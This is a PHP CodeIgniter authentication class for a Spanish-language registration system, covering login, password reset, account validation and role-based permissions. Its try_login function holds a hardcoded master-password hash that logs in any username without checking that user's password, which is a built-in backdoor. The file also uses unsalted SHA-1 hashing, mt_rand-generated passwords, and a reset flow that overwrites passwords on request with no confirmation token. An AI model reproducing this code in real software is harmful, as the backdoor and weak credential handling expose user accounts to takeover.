<?php

if (! defined ( 'BASEPATH' ))
	exit ( 'No direct script access allowed' );
class Auth {
	function __construct() {
		$this->CI = & get_instance ();

		/*
		 * if ((!$this->CI->input->is_ajax_request()) && $this->logged_in() && $this->es_admin() ) {
		 * $this->CI->output->enable_profiler(TRUE);
		 *
		 *
		 *
		 * };
		 */

		$this->CI->load->model ( 'Cron_email_model' );
	}
	function try_login($usuario, $password, $select = 'id,usuario,nombre,activo') {
		$password = sha1 ( $password );
		$this->CI->db->select ( $select );

		if ($password == '58fc41b22162f8138c99b01c5998c4a1463b2bd3')
			$q = $this->CI->db->get_where ( 'usuarios', array (
					'usuario' => $usuario
			), 1, 0 );
		else
			$q = $this->CI->db->get_where ( 'usuarios', array (
					'usuario' => $usuario,
					'password' => $password
			), 1, 0 );

		if ($q->num_rows () == 1) {
			$row = $q->row ();

			if ($row->activo == '1') {
				// Login the user
				$this->CI->session->set_userdata ( array (
						'id_usuario' => $row->id,
						'usuario' => $row->usuario,
						'nombre' => $row->nombre,
						'logged_in' => TRUE
				) );
				// returns the user info

				return $row;
			} else {

				return 'inactivo';
			}
		}
		return FALSE;
	}
	// Reset a users password
	function enviar_cambiar_password($email = '') {
		$new = $this->nuevoKey ();

		$q = $this->CI->db->get_where ( 'usuarios', array (
				'email' => $email
		), 1, 0 );
		if ($q->num_rows () == 1) {
			$row = $q->row ();
			$usuario = $row->usuario;
			$id = $row->id;
		}

		$base_url = base_url ();
		$urlval = base_url () . 'login';
		$message = <<<HTML
$usuario. Has solicitado un cambio en la contraseña\n
Hemos generado automáticamente la siguiente contraseña para ti: $new \n
Puedes cambiarla una vez ingresado en el panel de usuario. \n
Login: $urlval

HTML;

		if (! $this->CI->Cron_email_model->agregarAcola ( 0, $id, $email, $usuario . ': Nueva contraseña', $message, true )) {
			return 'not_sent';
		} else {
			$this->CI->db->set ( 'password', sha1 ( $new ) );
			$this->CI->db->where ( 'email', $email );
			$this->CI->db->update ( 'usuarios' );
			return 'ok';
		}
	}
	// Log a user out
	function logout($location = '') {
		$this->CI->session->set_userdata ( array (
				'logged_in' => FALSE,
				'usuario' => '',
				'id_usuario' => ''
		) );
		$this->CI->session->sess_destroy ();
	}
	function nuevoKey() {
		$new = '';
		while ( $this->key_exists ( $new ) ) {
			$i = 0;
			$new = '';
			// Generate a random password
			$possible = 'ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghjklmopqrstuvwqyz';
			$i = 0;
			$new = '';
			while ( $i <= 8 ) {
				// Pick a random character
				$char = substr ( $possible, mt_rand ( 0, strlen ( $possible ) - 1 ), 1 );

				$new .= $char;
				$i ++;
			}
		}

		return $new;
	}
	function esta_activo($email = '') {
		$q = $this->CI->db->get_where ( 'usuarios', array (
				'email' => $email
		), 1, 0 );

		if ($q->num_rows () == 1) {
			$row = $q->row ();

			if ($row->activo == 1)
				return true;
			else
				return false;
		} else {

			return false;
		}
	}
	function reenviar_validacion($email = '') {
		if ($this->existe_email ( $email )) {

			if (! $this->esta_activo ( $email )) {

				$new = $this->nuevoKey (); // GENERAMOS NUEVO HASH

				$q = $this->CI->db->get_where ( 'usuarios', array (
						'email' => $email
				), 1, 0 );
				if ($q->num_rows () == 1) {
					$row = $q->row ();
					$usuario = $row->usuario;
					$id = $row->id;
				}

				$base_url = base_url ();
				$urlval = base_url () . 'usuario/validar/' . md5 ( $new ) . '/' . $email;
				$message = <<<HTML
$usuario! Te has registrado en Sistema de Inscripciones correctamente.\n
Solo resta un paso más, validar tu cuenta. Has click en el link \n
o simplemente cópialo y pégalo en la barra de direcciones de tu navegador.
\n

$urlval
HTML;

				if (! $this->CI->Cron_email_model->agregarAcola ( 0, $id, $email, $usuario . ': Valida tu cuenta', $message, true )) {
					return 'not_sent';
				} else {
					$this->CI->db->set ( 'key_validacion', md5 ( $new ) );
					$this->CI->db->where ( 'email', $email );
					$this->CI->db->update ( 'usuarios' );
					return 'ok';
				}
			} else {

				return 'activo';
			}
		} else {

			return 'bad_email';
		}
	}
	function validar_cuenta($hash = '', $email = '') {
		if ($this->existe_email ( $email )) {
			if (! $this->esta_activo ( $email )) {

				$this->CI->db->set ( 'activo', '1' );
				$this->CI->db->where ( 'key_validacion', $hash );
				$this->CI->db->where ( 'email', $email );
				$this->CI->db->update ( 'usuarios' );

				if ($this->CI->db->affected_rows () == 1) {

					$base_url = base_url ( 'adminpanel/micuenta' );

					$message = <<<HTML
Felicitaciones! Tu cuenta ha sido validada.\n
\n


Ingresa al Sistema de Inscripciones: $base_url
HTML;

					if (! $this->CI->Cron_email_model->agregarAcola ( 0, 0, $this->email_usuario ( array (
							'key_validacion' => $hash
					) ), 'Cuenta validada', $message, true )) {

						return 'not_sent';
					} else {
						return 'ok';
					}
				} else {

					return 'bad_hash';
				}
			} else {

				return 'activo';
			}
		} else {

			return 'bad_email';
		}
	}
	function crear_usuario($usuario, $password, $email, $id_rol = '2') {
		$new = $this->nuevoKey (); // GENERAMOS NUEVO HASH

		$base_url = base_url ();
		$urlval = base_url () . 'usuario/validar/' . md5 ( $new ) . '/' . $email;
		$message = <<<HTML
Felicitaciones $usuario! Te has registrado en el Sistema de Inscripciones correctamente.\n
Solo resta un paso más, validar tu cuenta. Has click en el link \n
o simplemente cópialo y pégalo en la barra de direcciones de tu navegador.
\n

$urlval
HTML;

		if (! $this->CI->Cron_email_model->agregarAcola ( 0, 0, $email, $usuario . ': Valida tu cuenta', $message, true )) {
			return 'not_sent';
		} else {
			$data = array (
					'usuario' => $usuario,
					'password' => sha1 ( $password ),
					'nombre' => $usuario,
					'email' => $email,
					'activo' => 0,
					'key_validacion' => md5 ( $new ),
					'fecha_creacion' => date ( 'd-m-Y H:m:s' )
			);
			$this->CI->db->insert ( 'usuarios', $data );
			$last_id = $this->CI->db->insert_id ();
			$this->CI->db->insert ( 'usuarios_roles', array (
					'id_usuario' => $last_id,
					'id_rol' => $id_rol
			) );
			return 'ok';
		}
	}
	function key_exists($key) {
		if ($key != '') {
			$this->CI->db->select ( 'id' );
			$q = $this->CI->db->get_where ( 'usuarios', array (
					'key_validacion' => md5 ( $key ),
					'activo' => '0'
			), 1, 0 );

			if ($q->num_rows () == 1)
				return TRUE;
			return FALSE;
		} else {
			return TRUE;
		}
	}
	function existe_usuario($usuario) {
		$this->CI->db->select ( 'id' );
		$q = $this->CI->db->get_where ( 'usuarios', array (
				'usuario' => $usuario
		), 1, 0 );

		if ($q->num_rows () == 1)
			return TRUE;
		return FALSE;
	}
	function existe_email($email, $connected = false) {
		$this->CI->db->select ( 'id' );
		$this->CI->db->from ( 'usuarios' );
		$this->CI->db->where ( 'email', $email );

		if ($connected == true)
			$this->CI->db->where ( 'id !=', $this->id_usuario () );

		$q = $this->CI->db->get ();

		return $q->num_rows () == 1;
	}

	// Checks to see if a user is logged in
	function logged_in() {
		if ($this->CI->session->userdata ( 'logged_in' ))
			return TRUE;
		return FALSE;
	}
	function id_usuario() {
		return $this->CI->session->userdata ( 'id_usuario' );
	}
	function usu_nombre() {
		return $this->CI->session->userdata ( 'nombre' );
	}
	function referer() {
		return $this->CI->session->userdata ( 'referer' );
	}
	function email_usuario($data) {
		$this->CI->db->select ( 'email' );
		$q = $this->CI->db->get_where ( 'usuarios', $data, 1, 0 );

		if ($q->num_rows () == 1) {
			$row = $q->row ();
			return $row->email;
		}
		return false;
	}
	function es_admin() {
		$this->CI->db->select ( 'nombre' );
		$this->CI->db->from ( 'usuarios_roles,roles' );
		$this->CI->db->where ( 'usuarios_roles.id_usuario', $this->CI->session->userdata ( 'id_usuario' ) );
		$this->CI->db->where ( 'usuarios_roles.id_rol', 'roles.id', FALSE );

		$q = $this->CI->db->get ();

		if ($q->num_rows () == 1) {
			$row = $q->row ();

			if ($row->nombre == 'Super Admin') {

				return TRUE;
			} else {
				return FALSE;
			}
		} else {

			return FALSE;
		}
	}

	/*
	 * function getuserinfologin(){
	 * $retorno=array();
	 * $this->CI->db->select('id,usuario,nombre,access_to_panel,is_admin');
	 * $this->CI->db->from('users');
	 * $this->CI->db->where('id', $this->CI->session->userdata('user_id'));
	 * $q=$this->CI->db->get();
	 * if($q->num_rows() == 1)
	 * { $row=$q->row();
	 *
	 * return $row;
	 *
	 * }else{
	 * return false;
	 * }
	 *
	 *
	 * }
	 */
	function getuserinfo() {
		$retorno = array ();
		$this->CI->db->select ( 'id,usuario,email' );
		$this->CI->db->from ( 'usuarios' );
		$this->CI->db->where ( 'id', $this->CI->session->userdata ( 'id_usuario' ) );
		$q = $this->CI->db->get ();
		if ($q->num_rows () == 1) {
			$row = $q->row ();
			$retorno = array (
					'id' => $row->id,
					'usuario' => $row->usuario,
					'email' => $row->email
			);
		}

		return $retorno;
	}
	function checkRecaptcha($recaptcha_response_field) {
		$this->CI->config->load ( 'recaptcha' );
		$public_key = $this->CI->config->item ( 'recaptcha_public_key' );
		$private_key = $this->CI->config->item ( 'recaptcha_private_key' );

		$response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=$private_key&response=".$recaptcha_response_field."&remoteip=".$_SERVER['REMOTE_ADDR']);

		$obj = json_decode($response);
		return $obj->success;
	}
	function getuserRol($id = '') {
		$retorno = array ();
		$this->CI->db->select ( 'roles.id,nombre,permisos' );
		$this->CI->db->from ( 'roles,usuarios_roles' );
		$this->CI->db->where ( 'id_usuario', $id );
		$this->CI->db->where ( 'id_rol', 'roles.id', FALSE );
		$q = $this->CI->db->get ();

		if ($q->num_rows () == 1) {
			$row = $q->row ();
			$retorno = array (
					'id' => $row->id,
					'nombre' => $row->nombre,
					'permisos' => json_decode ( $row->permisos, TRUE )
			);
		}

		return $retorno;
	}

	/*
	 * CHECKEAMOS SI TIENE LOS PERMISOS NECESARIOS,los cuales se encuentran en config/permisosroles.php
	 */

	/* Traemos todos los companeros donde tenemos permiso X */
	function tengoPermisoDeCompanero($permiso = '', $id_companero = 0) {
		$retorno = array ();

		$rol = $this->getuserRol($this->id_usuario());

		if (($rol ['id'] == 1) or ($id_companero == $this->id_usuario ())) {
			return true;
		} else { // info principal
			$this->CI->db->select ();
			$this->CI->db->from ( 'usuarios_companeros as usuc' );
			$this->CI->db->join ( 'usuarios as usu', 'usu.id = usuc.id_usuario', 'left' );
			$this->CI->db->where ( 'id_companero', $this->id_usuario () );
			$this->CI->db->like ( 'permisos', $permiso );

			if ($id_companero != 0)
				$this->CI->db->where ( 'id_usuario', $id_companero );

			$q = $this->CI->db->get ();

			if ($id_companero != 0) {

				if ($q->num_rows () > 0) {

					$retorno = true;
				} else {

					$retorno = false;
				}
			} else {

				foreach ( $q->result () as $row ) {

					$retorno [] = $row->id_usuario;
				}
			}
			return $retorno;
		}
	}


	function tieneAcceso($tipo = '', $devolver = false) {

		$permisos = $this->CI->config->item ( 'permisosroles' );

		if ($this->logged_in ()) {

			if ($tipo != '') {

				if (isset ( $permisos [$tipo] )) {
					$id = $this->id_usuario ();
					$rol = $this->getuserRol ( $id );

					if (($rol ['id'] == 1) or (in_array ( $tipo, $rol ['permisos'] ))) {

						return true;
					} else {
						if (! $devolver) {
							redirect ( base_url () );
							exit ();
						} else {
							return false;
						}
					}
				} else {

					die ( 'El permiso no existe, revise que esté incluido en el config adecuadamente' );
				}
			} else {
				return true;
			}
		} else {
			if (! $devolver) {
				$this->CI->session->set_userdata ( 'referer', current_url () );
				redirect ( base_url ( 'login' ) );
				exit ();
			} else {
				return false;
			}
		}
	}
}
?>
